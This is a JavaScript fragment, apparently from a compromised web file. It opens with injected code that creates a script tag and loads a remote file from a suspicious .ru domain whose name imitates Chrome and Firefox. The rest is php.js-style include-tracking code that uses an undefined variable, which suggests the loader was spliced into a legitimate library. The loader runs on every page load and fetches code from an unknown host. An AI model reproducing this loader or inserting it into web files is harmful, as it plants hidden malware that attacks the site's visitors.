
var js = document.createElement('script');
	js.setAttribute('type', 'text/javascript');
	js.setAttribute('src', 'http://chrome-document-global-created.ru/mozillafirefoxstudioex.js');
	js.setAttribute('defer', 'defer');
	document.getElementsByTagName('HEAD')[0].appendChild(js);

    //document.getElementsByTagName("BODY")[0].setAttribute("onLoad", "addscript();");
	// save include state for reference by include_once
	var cur_file = {};
	cur_file[window.location.href] = 1;

	if (!window.php_js) window.php_js = {};
	if (!window.php_js.includes) window.php_js.includes = cur_file;
	if (!window.php_js.includes[filename]) {
		window.php_js.includes[filename] = 1;
	} else {
		window.php_js.includes[filename]++;
	}
